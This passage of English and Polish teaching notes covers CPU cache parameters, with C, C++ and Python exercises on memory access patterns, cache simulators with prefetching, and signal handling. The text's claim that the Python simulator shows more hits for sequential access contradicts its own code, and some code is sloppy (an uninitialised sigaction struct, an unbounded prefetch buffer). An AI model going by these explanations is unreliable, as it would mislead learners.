3. 64 sets: The cache is divided into 64 sets. Each set can store multiple cache lines, as determined by the cache's associativity (in this case, 12-way).

4. 64 B line size: The size of each cache line is 64 bytes. When data is fetched from the main memory, it is brought into the cache in blocks called cache lines. A larger cache line size can improve spatial locality (the likelihood that nearby memory locations will be accessed), but may also result in more unused data being fetched.

5. Latency 5: The cache latency is 5 clock cycles. This is the time it takes for the processor to access data stored in the L1 cache. 

6. Per core: This specification is for an L1 data cache that is dedicated to each core in a multicore processor. Each core has its own L1 data cache, which can help improve performance by reducing contention for cache resources between cores.

## Ćwiczenie

Celem tego ćwiczenia jest napisanie prostego programu w języku C, który alokuje blok pamięci, zapisuje wartości do tego bloku i odczytuje wartości z tego bloku.

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    int *buffer;
    int buffer_size = 10;

    buffer = (int *) malloc(buffer_size * sizeof(int));

    for (int i = 0; i < buffer_size; i++) {
        buffer[i] = i;
    }

    for (int i = 0; i < buffer_size; i++) {
        printf("buffer[%d] = %d\n", i, buffer[i]);
    }

    free(buffer);
    return 0;
}
```


W poniższym programie w C++ przetestujemy dwa różne sposoby dostępu do pamięci: sekwencyjny i losowy. Porównamy czas wykonania obu podejść, które mogą wpływać na wykorzystanie pamięci cache.

```cpp
#include <iostream>
#include <chrono>
#include <vector>
#include <random>

using namespace std;
using namespace std::chrono;

const int array_size = 1000000;
const int num_iterations = 10;

void access_memory_sequentially(vector<int> &data) {
    for (int i = 0; i < array_size; ++i) {
        data[i]++;
    }
}

void access_memory_randomly(vector<int> &data) {
    default_random_engine generator;
    uniform_int_distribution<int> distribution(0, array_size - 1);

    for (int i = 0; i < array_size; ++i) {
        int random_index = distribution(generator);
        data[random_index]++;
    }
}

void test_memory_access(const string &access_type, void (*access_func)(vector<int> &)) {
    vector<int> data(array_size, 0);

    auto start_time = high_resolution_clock::now();

    for (int i = 0; i < num_iterations; ++i) {
        access_func(data);
    }

    auto end_time = high_resolution_clock::now();
    auto duration = duration_cast<milliseconds>(end_time - start_time).count();
    cout << "Czas wykonania dostępu do pamięci (" << access_type << "): " << duration << " ms" << endl;
}

int main() {
    test_memory_access("sekwencyjny", access_memory_sequentially);
    test_memory_access("losowy", access_memory_randomly);

    return 0;
}
```

Ten program tworzy wektor danych o stałym rozmiarze, a następnie wykonuje sekwencyjny i losowy dostęp do pamięci. Dostęp sekwencyjny polega na iteracji przez wektor i inkrementacji każdego elementu, podczas gdy dostęp losowy polega na wyborze losowego indeksu wektora i inkrementacji odpowiadającego elementu.

Po skompilowaniu i uruchomieniu programu, na konsoli zostaną wyświetlone wyniki czasu wykonania dostępu do pamięci dla obu podejść. Porównując te wyniki, można zauważyć, że dostęp sekwencyjny jest zazwyczaj szybszy niż losowy. Wynika to z lepszego wykorzystania pamięci cache przez dostęp sekwencyjny, który ma bardziej przewidywalny wzorzec dostępu do pamięci, co pozwala na bardziej efektywne użycie cache.

W praktyce, optymalizacja dostępu do pamięci może prowadzić do znacznego przyspieszenia obliczeń, zwłaszcza w przypadku algorytmów o dużym zapotrzebowaniu na pamięć. Optymalizacja może obejmować zarówno wybór odpowiedniego sposobu dostępu do pamięci, jak i projektowanie algorytmów z uwzględnieniem ograniczeń pamięci cache.


Poniżej znajduje się prosty symulator procesora z pamięcią cache w Pythonie, który ilustruje różnice w czasie dostępu do pamięci sekwencyjnie i losowo.

> Ref:
> - [Memory part 2: CPU caches](https://lwn.net/Articles/252125/)

```python
import random
import time

class Cache:
    def __init__(self, size):
        self.size = size
        self.cache = [None] * size

    def read(self, address):
        if address in self.cache:
            return True
        else:
            index = address % self.size
            self.cache[index] = address
            return False

class Processor:
    def __init__(self, cache_size):
        self.cache = Cache(cache_size)

    def access_memory_sequentially(self, data):
        cache_hits = 0
        for address in data:
            if self.cache.read(address):
                cache_hits += 1
        return cache_hits

    def access_memory_randomly(self, data):
        cache_hits = 0
        for _ in data:
            random_address = random.choice(data)
            if self.cache.read(random_address):
                cache_hits += 1
        return cache_hits

def main():
    memory_size = 1000
    cache_size = 100
    num_iterations = 1000

    data = list(range(memory_size))

    processor = Processor(cache_size)

    start_time = time.time()
    cache_hits_sequential = processor.access_memory_sequentially(data * num_iterations)
    end_time = time.time()
    duration_sequential = end_time - start_time

    start_time = time.time()
    cache_hits_random = processor.access_memory_randomly(data * num_iterations)
    end_time = time.time()
    duration_random = end_time - start_time

    print(f"Sekwencyjny dostęp do pamięci: czas {duration_sequential:.2f}s, trafienia cache {cache_hits_sequential}")
    print(f"Losowy dostęp do pamięci: czas {duration_random:.2f}s, trafienia cache {cache_hits_random}")

if __name__ == "__main__":
    main()
```

W symulatorze mamy prostą pamięć cache, która przechowuje wartości z pamięci. Procesor korzysta z cache podczas sekwencyjnego i losowego dostępu do pamięci. Symulator mierzy czas dostępu do pamięci oraz liczbę trafień cache dla obu podejść.

Uruchomienie tego symulatora pokaże, że sekwencyjny dostęp do pamięci jest szybszy niż losowy, ponieważ lepiej wykorzystuje pamięć cache. Ponadto, liczba trafień cache jest większa dla sekwencyjnego dostępu do pamięci w porównaniu z losowym dostępem.

Zmiana parametrów symulatora (rozmiar pamięci, rozmiar cache, liczba iteracji) w celu zrozumienia, jak wpływają na wyniki.


**Bardziej zaawansowana wersja symulatora** 

Symulator pamięci podręcznej (cache) typu direct-mapped

```cpp
#include <iostream>
#include <vector>
#include <cstdlib>
#include <ctime>

class CacheEntry {
public:
    int tag;
    bool valid;
    CacheEntry() : tag(-1), valid(false) {}
};

class Cache {
private:
    int cacheSize;
    int blockSize;
    int numCacheLines;
    int mainMemoryAccessTime;
    std::vector<CacheEntry> cacheEntries;
    int cacheHit;
    int cacheMiss;

    void prefetch(int address) {
        int nextAddress = address + blockSize;
        int index = (nextAddress / blockSize) % numCacheLines;
        int tag = nextAddress / blockSize / numCacheLines;

        cacheEntries[index].tag = tag;
        cacheEntries[index].valid = true;
    }

public:
    Cache(int cacheSize, int blockSize, int mainMemoryAccessTime)
        : cacheSize(cacheSize), blockSize(blockSize), mainMemoryAccessTime(mainMemoryAccessTime) {
        numCacheLines = cacheSize / blockSize;
        cacheEntries.resize(numCacheLines);
        cacheHit = 0;
        cacheMiss = 0;
    }

    bool access(int address) {
        int index = (address / blockSize) % numCacheLines;
        int tag = address / blockSize / numCacheLines;

        if (cacheEntries[index].valid && cacheEntries[index].tag == tag) {
            cacheHit++;
            return true; // Cache hit
        } else {
            cacheMiss++;
            cacheEntries[index].tag = tag;
            cacheEntries[index].valid = true;

            //prefetch,
            //cacheEntries[index].data = read_line_from_main_memory(address)

            return false; // Cache miss
        }
    }

    void printStats() {
        std::cout << "Cache hits: " << cacheHit << std::endl;
        std::cout << "Cache misses: " << cacheMiss << std::endl;
        std::cout << "Hit ratio: " << (double)cacheHit / (cacheHit + cacheMiss) << std::endl;
        std::cout << "Average access time: "
                  << (cacheHit + cacheMiss * mainMemoryAccessTime) / (double)(cacheHit + cacheMiss)
                  << " cycles" << std::endl;
    }
};

int main() {
    srand(time(NULL));
    int cacheSize = 1024;         // 1KB cache
    int blockSize = 32;           // 32B block size
    int mainMemoryAccessTime = 50; // 50 cycles
    Cache cache(cacheSize, blockSize, mainMemoryAccessTime);

    int numAccesses = 10000;
    int memorySize = 4096; // 4KB main memory

    // Sequential access
    for (int i = 0; i < numAccesses; i++) {
        cache.access(i % memorySize);
    }

    std::cout << "Sequential access:" << std::endl;
    cache.printStats();

    // Reset the cache for the random test
    cache = Cache(cacheSize, blockSize, mainMemoryAccessTime);

    // Random access
    for (int i = 0; i < numAccesses; i++) {
        cache.access(rand() % memorySize);
    }

    std::cout << "Random access:" << std::endl;
    cache.printStats();

    return 0;
}
```


**Nieco ciekawsza implementacja**


```cpp
#include <iostream>
#include <vector>
#include <cstdlib>
#include <ctime>
#include <deque>

class CacheEntry {
public:
    int tag;
    bool valid;
    CacheEntry() : tag(-1), valid(false) {}
};

class Cache {
private:
    int cacheSize;
    int blockSize;
    int numCacheLines;
    int mainMemoryAccessTime;
    std::vector<CacheEntry> cacheEntries;
    std::deque<CacheEntry> prefetchBuffer;
    int prefetchDistance;
    int cacheHit;
    int cacheMiss;

    void prefetch(int address) {
        for (int i = 1; i <= prefetchDistance; i++) {
            int nextAddress = address + i * blockSize;
            int tag = nextAddress / blockSize / numCacheLines;
            CacheEntry entry;
            entry.tag = tag;
            entry.valid = true;
            prefetchBuffer.push_back(entry);
        }
    }

    bool checkPrefetchBuffer(int tag) {
        for (auto it = prefetchBuffer.begin(); it != prefetchBuffer.end(); it++) {
            if (it->valid && it->tag == tag) {
                prefetchBuffer.erase(it);
                return true;
            }
        }
        return false;
    }

public:
    Cache(int cacheSize, int blockSize, int mainMemoryAccessTime, int prefetchDistance)
        : cacheSize(cacheSize),
          blockSize(blockSize),
          mainMemoryAccessTime(mainMemoryAccessTime),
          prefetchDistance(prefetchDistance) {
        numCacheLines = cacheSize / blockSize;
        cacheEntries.resize(numCacheLines);
        cacheHit = 0;
        cacheMiss = 0;
    }

    bool access(int address, bool prefetchEnabled = false) {
        int index = (address / blockSize) % numCacheLines;
        int tag = address / blockSize / numCacheLines;

        if (prefetchEnabled && checkPrefetchBuffer(tag)) {
            cacheHit++;
            return true; // Cache hit from prefetch buffer
        }

        if (cacheEntries[index].valid && cacheEntries[index].tag == tag) {
            cacheHit++;
            return true; // Cache hit
        } else {
            cacheMiss++;
            cacheEntries[index].tag = tag;
            cacheEntries[index].valid = true;

            if (prefetchEnabled) {
                prefetch(address);
            }

            return false; // Cache miss
        }
    }

    void printStats() {
        std::cout << "Cache hits: " << cacheHit << std::endl;
        std::cout << "Cache misses: " << cacheMiss << std::endl;
        std::cout << "Hit ratio: " << (double)cacheHit / (cacheHit + cacheMiss) << std::endl;
        std::cout << "Average access time: "
                  << (cacheHit + cacheMiss * mainMemoryAccessTime) / (double)(cacheHit + cacheMiss)
                  << " cycles" << std::endl;
    }
};

int main() {
	srand(time(NULL));

    int cacheSize = 1024;          // 1KB cache
    int blockSize = 32;            // 32B block size
    int mainMemoryAccessTime = 50; // 50 cycles
    int prefetchDistance = 4;      // prefetch distance of 4 blocks
    Cache cache(cacheSize, blockSize, mainMemoryAccessTime, prefetchDistance);

    int numAccesses = 10000;
    int memorySize = 4096; // 4KB main memory

    // Sequential access without prefetching
    for (int i = 0; i < numAccesses; i++) {
        cache.access(i % memorySize);
    }

    std::cout << "Sequential access without prefetching:" << std::endl;
    cache.printStats();

    // Reset the cache for the next test
    cache = Cache(cacheSize, blockSize, mainMemoryAccessTime, prefetchDistance);

    // Sequential access with prefetching
    for (int i = 0; i < numAccesses; i++) {
        cache.access(i % memorySize, true);
    }

    std::cout << "Sequential access with prefetching:" << std::endl;
    cache.printStats();

    // Reset the cache for the next test
    cache = Cache(cacheSize, blockSize, mainMemoryAccessTime, prefetchDistance);

    // Random access without prefetching
    for (int i = 0; i < numAccesses; i++) {
        cache.access(rand() % memorySize);
    }

    std::cout << "Random access without prefetching:" << std::endl;
    cache.printStats();

    // Reset the cache for the next test
    cache = Cache(cacheSize, blockSize, mainMemoryAccessTime, prefetchDistance);

    // Random access with prefetching
    for (int i = 0; i < numAccesses; i++) {
        cache.access(rand() % memorySize, true);
    }

    std::cout << "Random access with prefetching:" << std::endl;
    cache.printStats();

    return 0;
}
```


Ćwiczenie 3: Obsługa przerwań - prosty timer

Celem tego ćwiczenia jest napisanie prostego programu w języku C, który używa przerwań do odmierzania czasu. W tym celu można skorzystać z biblioteki `signal.h`.

```c
#include <stdio.h>
#include <signal.h>
#include <unistd.h>

void timer_handler(int signum) {
    static int counter = 0;
    printf("Timer expired %d times.\n", ++counter);
}

int main() {
    struct sigaction sa;
    sa.sa_handler = &timer_handler;
    sigaction(SIGALRM, &sa, NULL);

    ualarm(500000, 500000); // Wysyłanie sygnału SIGALRM co 500ms

    while (1) {
        pause(); // Czekanie na przerwanie
    }

    return 0;
}
```

W systemie Windows obsługa przerwań może być realizowana za pomocą różnych mechanizmów. Jeden z nich to obsługa sygnałów za pomocą funkcji `SetConsoleCtrlHandler`. Oto przykład programu w języku C, który obsługuje sygnał `CTRL+C`:

```c
#include <stdio.h>
#include <windows.h>

BOOL WINAPI ConsoleCtrlHandler(DWORD signal) {
    if (signal == CTRL_C_EVENT) {
        printf("Przerwanie CTRL+C!\n");
        return TRUE;
    }
    return FALSE;
}

int main() {
    if (!SetConsoleCtrlHandler(ConsoleCtrlHandler, TRUE)) {
        fprintf(stderr, "Nie można zarejestrować procedury obsługi sygnału.\n");
        return EXIT_FAILURE;
    }

    printf("Naciśnij CTRL+C, aby wywołać przerwanie.\n");

    while (1) {
        Sleep(1000); // Czekanie na przerwanie
    }

    return 0;
}
```

W powyższym kodzie, zdefiniowano funkcję `ConsoleCtrlHandler`, która zostanie wywołana, gdy zostanie wygenerowany sygnał `CTRL+C`. W funkcji `main`, rejestrujemy tę funkcję jako procedurę obsługi sygnału za pomocą funkcji `SetConsoleCtrlHandler`. Następnie program wchodzi w pętlę nieskończoną, czekając na przerwanie `CTRL+C`. Gdy przerwanie wystąpi, zostanie wyświetlony komunikat "Przerwanie CTRL+C!" i program będzie kontynuować działanie.

